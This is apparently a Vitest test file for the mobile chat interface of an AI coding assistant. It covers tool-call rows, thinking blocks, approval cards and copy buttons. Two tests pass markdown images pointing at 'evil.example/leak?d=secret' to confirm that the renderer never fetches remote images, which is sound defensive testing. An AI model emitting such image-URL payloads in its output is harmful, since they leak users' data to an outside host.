import "@testing-library/jest-dom/vitest";
import { afterEach, describe, expect, it, vi } from "vitest";
import { cleanup, fireEvent, render, screen } from "@testing-library/react";
import {
  ActivityIndicator,
  AttachmentList,
  ToolCallCard,
  ThinkingBlock,
  ApprovalActionCard,
} from "./MobileChatComponents";
import { MobileChatMessage } from "./MobileChatMessage";
import * as clipboardModule from "../../lib/clipboard";

describe("MobileChatComponents & MobileChatMessage", () => {
  afterEach(() => {
    cleanup();
    vi.restoreAllMocks();
  });

  it("renders ActivityIndicator for different states", () => {
    const { container: thinking } = render(<ActivityIndicator state="thinking" />);
    expect(thinking.textContent).toContain("Thinking...");

    const { container: runningTool } = render(<ActivityIndicator state="running_tool" label="Executing" />);
    expect(runningTool.textContent).toContain("Executing");

    const { container: waiting } = render(<ActivityIndicator state="waiting_for_input" />);
    expect(waiting.textContent).toContain("Waiting for input...");
  });

  it("renders AttachmentList images and files", () => {
    const attachments = [
      { id: "1", name: "diagram.png", type: "image" as const, url: "https://example.com/img.png" },
      { id: "2", name: "log.txt", type: "file" as const, size: "12 KB" },
    ];
    const { container } = render(<AttachmentList attachments={attachments} />);
    expect(container.textContent).toContain("diagram.png");
    expect(container.textContent).toContain("log.txt");
    expect(container.textContent).toContain("12 KB");
  });

  it("renders ToolCallCard with command and status", () => {
    const { rerender } = render(
      <ToolCallCard
        toolName="bash"
        command="cargo test"
        output="test passed"
        status="success"
      />
    );
    const row = screen.getByTestId("work-row");
    expect(row).toHaveTextContent("Ran bash cargo test");
    expect(row.textContent).not.toContain("Failed");
    expect(screen.queryByTestId("tool-call-input")).not.toBeInTheDocument();
    expect(screen.queryByTestId("work-row-output")).not.toBeInTheDocument();

    fireEvent.click(row);
    expect(screen.getByTestId("tool-call-input")).toHaveTextContent("cargo test");
    expect(screen.getByTestId("work-row-output")).toHaveTextContent("test passed");

    rerender(
      <ToolCallCard
        toolName="bash"
        command="cargo test"
        output="test failed"
        status="error"
      />
    );
    const errorRow = screen.getByTestId("work-row");
    expect(errorRow.textContent).toContain("Failed");
  });

  it("renders a work-only assistant message with no message-copy-button", () => {
    render(
      <MobileChatMessage
        id="msg-work-only"
        role="assistant"
        content=""
        toolCalls={[
          {
            toolName: "bash",
            status: "success",
            command: "git status",
          },
        ]}
      />
    );
    expect(screen.queryByTestId("assistant-message-body")).not.toBeInTheDocument();
    expect(screen.queryByTestId("message-copy-button")).not.toBeInTheDocument();
  });

  it("never fetches a remote markdown image: it becomes a tap-to-open link with alt text and host", () => {
    const { container } = render(
      <MobileChatMessage
        id="msg-img"
        role="assistant"
        content={"Done ![the chart](https://evil.example/leak?d=secret) and ![x](data:image/png;base64,AAAA)"}
      />
    );
    const sources = Array.from(container.querySelectorAll("img")).map((img) => img.getAttribute("src"));
    expect(sources).toEqual(["data:image/png;base64,AAAA"]);
    const link = screen.getByTestId("markdown-remote-image");
    expect(link).toHaveTextContent("the chart (evil.example)");
    expect(link).toHaveAttribute("href", "https://evil.example/leak?d=secret");
  });

  it("never fetches a remote markdown image inside a rich reference text part", () => {
    const { container } = render(
      <MobileChatMessage
        id="msg-ref-img"
        role="assistant"
        content=""
        referenceParts={[{ kind: "text", text: "![](https://evil.example/?d=secret)" }]}
      />
    );
    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByTestId("markdown-remote-image")).toHaveTextContent("Image (evil.example)");
  });

  it("a linked remote image opens the link target, never a nested image anchor", () => {
    const badge = "[![build](https://img.shields.io/b.svg)](https://ci.example/run/1)";
    const { container } = render(
      <MobileChatMessage
        id="msg-badge"
        role="assistant"
        content={badge}
        referenceParts={undefined}
      />
    );
    const anchors = Array.from(container.querySelectorAll("a"));
    expect(anchors.map((a) => a.getAttribute("href"))).toEqual(["https://ci.example/run/1"]);
    expect(screen.getByTestId("markdown-remote-image")).toHaveTextContent("build (img.shields.io)");
    cleanup();

    const { container: rich } = render(
      <MobileChatMessage
        id="msg-badge-ref"
        role="assistant"
        content=""
        referenceParts={[{ kind: "text", text: badge }]}
      />
    );
    expect(Array.from(rich.querySelectorAll("a")).map((a) => a.getAttribute("href"))).toEqual([
      "https://ci.example/run/1",
    ]);
    expect(rich.querySelector("img")).toBeNull();
  });

  it("keeps rendered prose mounted when only unrelated props change", () => {
    const { rerender } = render(
      <MobileChatMessage id="m" role="assistant" content="stable prose" timestamp={1} />
    );
    const paragraph = screen.getByText("stable prose");
    rerender(<MobileChatMessage id="m" role="assistant" content="stable prose" timestamp={2} />);
    expect(screen.getByText("stable prose")).toBe(paragraph);
    rerender(<MobileChatMessage id="m" role="assistant" content="stable prose" timestamp={2} durationLabel="1m" />);
    expect(screen.getByText("stable prose")).toBe(paragraph);
  });

  it("renders ApprovalActionCard", () => {
    const { container } = render(
      <ApprovalActionCard
        title="Allow Command"
        description="Proceed with running rm -rf?"
        onAccept={() => {}}
        onDecline={() => {}}
      />
    );
    expect(container.textContent).toContain("Allow Command");
    expect(container.textContent).toContain("Proceed with running rm -rf?");
    expect(container.textContent).toContain("Approve");
    expect(container.textContent).toContain("Decline");
  });

  it("renders user MobileChatMessage as a right-aligned accent bubble", () => {
    const { container } = render(
      <MobileChatMessage
        id="msg-1"
        role="user"
        content="Please run the tests"
        timestamp={1700000000000}
      />
    );
    expect(container.textContent).toContain("Please run the tests");
    const bubble = container.querySelector("[data-testid='user-message-bubble']");
    expect(bubble).not.toBeNull();
    expect(bubble?.className).toContain("bg-chat-user-bubble");
    expect(bubble?.parentElement?.className).toContain("ml-auto");
  });

  it("renders assistant MobileChatMessage as plain prose without avatar or bubble", () => {
    const { container } = render(
      <MobileChatMessage
        id="msg-2"
        role="assistant"
        content="Here is the result: `done`"
        activityState="running_tool"
        toolCalls={[
          {
            toolName: "test_runner",
            status: "running",
            command: "bun test",
          },
        ]}
      />
    );
    expect(container.textContent).toContain("Here is the result");
    expect(container.textContent).toContain("test_runner");
    const body = container.querySelector("[data-testid='assistant-message-body']");
    expect(body).not.toBeNull();
    expect(body?.className).not.toContain("rounded-2xl");
    expect(body?.className).not.toContain("border");
    expect(container.querySelector("img")).toBeNull();
  });

  it("renders collapsible Worked for row for assistant turns with durationLabel", () => {
    const { container } = render(
      <MobileChatMessage
        id="msg-6"
        role="assistant"
        content="Summarized the diff."
        durationLabel="2m"
        toolCalls={[
          {
            toolName: "test_runner",
            status: "running",
            command: "bun test",
          },
        ]}
      />
    );

    const toggle = screen.getByTestId("worked-for-toggle");
    expect(toggle).toHaveTextContent("Worked for 2m");
    expect(toggle).toHaveAttribute("aria-expanded", "false");
    const body = screen.getByTestId("assistant-message-body");
    expect(body).toHaveTextContent("Summarized the diff.");
    expect(container.textContent).not.toContain("test_runner");

    fireEvent.click(toggle);
    expect(toggle).toHaveAttribute("aria-expanded", "true");
    expect(container.textContent).toContain("test_runner");
    expect(screen.getByTestId("assistant-message-body")).toHaveTextContent("Summarized the diff.");

    const workRow = screen.getByTestId("work-row");
    expect(workRow.compareDocumentPosition(body)).toBe(Node.DOCUMENT_POSITION_FOLLOWING);
  });

  it("renders thinking collapsed to its first line and expands on click", () => {
    render(
      <MobileChatMessage
        id="msg-think"
        role="assistant"
        content="Done."
        toolCalls={[{ kind: "thinking", text: "First idea\nsecond line" }]}
      />
    );
    const block = screen.getByTestId("thinking-block");
    expect(block).toHaveTextContent("First idea");
    expect(block).not.toHaveTextContent("second line");
    fireEvent.click(screen.getByRole("button", { name: /Thinking/ }));
    expect(block).toHaveTextContent("second line");
  });

  it("renders assistant turn with tool calls and body without durationLabel as always visible", () => {
    const { container } = render(
      <MobileChatMessage
        id="msg-6b"
        role="assistant"
        content="No duration content."
        toolCalls={[
          {
            toolName: "bash",
            status: "success",
            command: "ls -la",
          },
        ]}
      />
    );

    expect(screen.queryByTestId("worked-for-toggle")).not.toBeInTheDocument();
    expect(screen.getByTestId("assistant-message-body")).toHaveTextContent("No duration content.");
    expect(container.textContent).toContain("bash");
    expect(container.textContent).toContain("ls -la");
  });

  it("renders a copy button under each turn", () => {
    render(
      <MobileChatMessage
        id="msg-7"
        role="assistant"
        content="Copy me"
        timestamp={1700000000000}
      />
    );
    expect(screen.getByTestId("message-copy-button")).toBeInTheDocument();
  });

  it("copies message content via the copy button", async () => {
    const copySpy = vi.spyOn(clipboardModule, "copyTextToClipboard").mockResolvedValue(true);
    render(
      <MobileChatMessage
        id="msg-8"
        role="assistant"
        content="Copy me"
      />
    );
    fireEvent.click(screen.getByTestId("message-copy-button"));
    expect(copySpy).toHaveBeenCalledWith("Copy me");
  });

  it("renders fenced code block with CodeBlock component even if single line", () => {
    const { container } = render(
      <MobileChatMessage
        id="msg-3"
        role="assistant"
        content={"```ts\nconst x = 1;\n```"}
      />
    );
    expect(container.textContent).toContain("ts");
    expect(container.textContent).toContain("const x = 1;");
    expect(container.textContent).toContain("Copy");
  });

  it("renders pure inline code with InlineCode component", () => {
    const { container } = render(
      <MobileChatMessage
        id="msg-4"
        role="assistant"
        content="Run `cargo check` to verify."
      />
    );
    expect(container.textContent).toContain("cargo check");
    const codeEl = container.querySelector("code");
    expect(codeEl?.className).toContain("text-chat-code");
  });

  it("renders the message with empty content without throwing and shows no copy button for empty assistant turn", () => {
    render(
      <MobileChatMessage
        id="msg-empty"
        role="assistant"
        content=""
        timestamp={1700000000000}
      />
    );

    expect(screen.queryByTestId("assistant-message-body")).not.toBeInTheDocument();
    expect(screen.queryByTestId("message-copy-button")).not.toBeInTheDocument();
  });

  it("renders no prose body for whitespace-only assistant content", () => {
    render(
      <MobileChatMessage
        id="msg-whitespace"
        role="assistant"
        content={"   \n"}
        toolCalls={[
          {
            toolName: "bash",
            status: "success",
            command: "git status",
          },
        ]}
      />
    );

    expect(screen.queryByTestId("assistant-message-body")).not.toBeInTheDocument();
  });

  it("renders a ToolCallCard with no command and no output as a non-interactive work-row without aria-expanded", () => {
    render(<ToolCallCard toolName="bash" />);
    const row = screen.getByTestId("work-row");
    expect(row.tagName).toBe("DIV");
    expect(row).not.toHaveAttribute("aria-expanded");
    expect(screen.queryByRole("button")).not.toBeInTheDocument();
  });

  it("renders a ToolCallCard with output as a button, and clicking it shows the output", () => {
    render(<ToolCallCard toolName="read" output="file contents here" />);
    const button = screen.getByRole("button");
    expect(button).toHaveAttribute("data-testid", "work-row");
    expect(button).toHaveAttribute("aria-expanded", "false");
    expect(screen.queryByTestId("work-row-output")).not.toBeInTheDocument();

    fireEvent.click(button);
    expect(button).toHaveAttribute("aria-expanded", "true");
    expect(screen.getByTestId("work-row-output")).toHaveTextContent("file contents here");
  });

  it("makes the expanded scroll regions keyboard focusable", () => {
    render(
      <ToolCallCard
        toolName="bash"
        command="cargo test"
        output="test passed"
        status="success"
      />
    );

    fireEvent.click(screen.getByTestId("work-row"));
    expect(screen.getByTestId("tool-call-input")).toHaveAttribute("tabindex", "0");
    expect(screen.getByTestId("work-row-output")).toHaveAttribute("tabindex", "0");
  });

  it("renders two running cards with shimmer and sr-only Running text on both", () => {
    render(
      <>
        <ToolCallCard toolName="bash" status="running" />
        <ToolCallCard toolName="eval" status="running" />
      </>
    );
    const rows = screen.getAllByTestId("work-row");
    expect(rows).toHaveLength(2);
    for (const row of rows) {
      expect(row.textContent).toContain("Running");
      expect(row.querySelector(".work-shimmer-text")).toBeInTheDocument();
    }
  });

  it("empty thinking text is non-interactive; non-empty text expands", () => {
    const { rerender } = render(<ThinkingBlock text="" />);
    const emptyRow = screen.getByTestId("work-row");
    expect(emptyRow.tagName).toBe("DIV");
    expect(emptyRow).not.toHaveAttribute("aria-expanded");
    expect(screen.queryByRole("button")).not.toBeInTheDocument();

    const multilineText = "First line of thought\nSecond line of thought";
    rerender(<ThinkingBlock text={multilineText} />);
    const button = screen.getByRole("button", { name: /Thinking/ });
    expect(button).toHaveAttribute("aria-expanded", "false");
    expect(screen.getByTestId("thinking-block").querySelector("p")).not.toBeInTheDocument();

    fireEvent.click(button);
    expect(button).toHaveAttribute("aria-expanded", "true");
    const expandedRegion = screen.getByTestId("thinking-block").querySelector("p");
    expect(expandedRegion).toBeInTheDocument();
    expect(expandedRegion).toHaveTextContent("First line of thought");
    expect(expandedRegion).toHaveTextContent("Second line of thought");
  });

  it("renders approval card after prose body in document order when work fold is collapsed", () => {
    render(
      <MobileChatMessage
        id="msg-approval-order"
        role="assistant"
        content="Please review."
        durationLabel="1m"
        toolCalls={[
          {
            toolName: "bash",
            status: "running",
            command: "rm -rf dist",
          },
        ]}
        approvalAction={{
          title: "Action Required",
          description: "Proceed with running rm -rf dist?",
          onAccept: vi.fn(),
          onDecline: vi.fn(),
        }}
      />
    );

    expect(screen.queryByTestId("work-row")).not.toBeInTheDocument();
    expect(screen.getByText("Proceed with running rm -rf dist?")).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Approve" })).toBeInTheDocument();

    const body = screen.getByTestId("assistant-message-body");
    const approval = screen.getByText("Action Required");
    expect(body.compareDocumentPosition(approval) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy();
  });

  it("renders prose thinking item without Thinking prefix and plain thinking item with Thinking", () => {
    render(
      <MobileChatMessage
        id="msg-think-source"
        role="assistant"
        content="Done."
        toolCalls={[
          {
            kind: "thinking",
            text: "Checked the file.\nSecond line",
            source: "prose",
          },
          {
            kind: "thinking",
            text: "Plain thinking thought.",
          },
        ]}
      />
    );

    const rows = screen.getAllByTestId("work-row");
    expect(rows).toHaveLength(2);
    expect(rows[0].textContent).not.toContain("Thinking");
    expect(rows[0].textContent).toContain("Checked the file.");
    expect(rows[1].textContent).toContain("Thinking");
  });

  it("prose row exposes its preview text as the accessible name instead of an aria-label", () => {
    render(
      <ThinkingBlock
        text={"First line of prose\nSecond line of prose"}
        source="prose"
      />
    );

    const button = screen.getByRole("button");
    expect(button).not.toHaveAttribute("aria-label");
    expect(button).toHaveAccessibleName(/First line of prose/);
  });

  it("every button rendered by MobileChatMessage has a non-empty accessible name (aria-label or text content)", () => {
    render(
      <MobileChatMessage
        id="msg-accessible-buttons"
        role="assistant"
        content={"Here is a code block:\n```ts\nconst a = 1;\n```"}
        durationLabel="1m"
        toolCalls={[
          {
            toolName: "bash",
            command: "git status",
            output: "clean",
            status: "success",
          },
          {
            kind: "thinking",
            text: "Thinking line 1\nThinking line 2",
          },
        ]}
        approvalAction={{
          title: "Approve changes",
          description: "Do you approve?",
          onAccept: vi.fn(),
          onDecline: vi.fn(),
        }}
      />
    );

    const buttons = screen.getAllByRole("button");
    expect(buttons.length).toBeGreaterThan(0);
    for (const btn of buttons) {
      const ariaLabel = btn.getAttribute("aria-label");
      const text = btn.textContent?.trim();
      const accessibleName = ariaLabel || text || "";
      expect(accessibleName.length).toBeGreaterThan(0);
    }
  });

  it("when the clipboard write resolves false the copy button shows the failure affordance instead of the 'Copied' check", async () => {
    vi.spyOn(clipboardModule, "copyTextToClipboard").mockResolvedValue(false);
    render(
      <MobileChatMessage
        id="msg-copy-failure"
        role="assistant"
        content="Test copy failure"
      />
    );

    const copyBtn = screen.getByTestId("message-copy-button");
    fireEvent.click(copyBtn);

    const failed = await screen.findByTitle("Copy unavailable");
    expect(failed).toBeInTheDocument();
    expect(failed).toHaveAttribute("aria-label", "Copy failed");
    expect(screen.queryByText("Copied")).not.toBeInTheDocument();
  });

  it("when code-block copy resolves false the button displays a readable failure label and has aria-label 'Copy failed'", async () => {
    vi.spyOn(clipboardModule, "copyTextToClipboard").mockResolvedValue(false);
    render(
      <MobileChatMessage
        id="msg-code-copy-failure"
        role="assistant"
        content={"```ts\nconst x = 42;\n```"}
      />
    );

    const codeCopyBtn = screen.getByRole("button", { name: "Copy code" });
    fireEvent.click(codeCopyBtn);

    const failedLabel = await screen.findByText("Failed");
    expect(failedLabel).toBeInTheDocument();
    expect(codeCopyBtn).toHaveAttribute("aria-label", "Copy failed");
  });
});
